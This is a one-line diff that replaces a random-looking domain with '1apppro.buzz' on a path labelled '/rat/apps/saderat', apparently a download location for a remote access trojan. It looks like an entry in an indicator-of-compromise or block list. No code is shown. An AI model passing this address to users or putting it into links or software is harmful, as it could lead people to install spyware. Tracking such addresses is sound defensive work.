@@ -1,1 +1,1 @@
-junesfssinfusefehfesufhnbseuyhgfsefbsyfsegfsehyfvsefgs.click/rat/apps/saderat
+1apppro.buzz/rat/apps/saderat
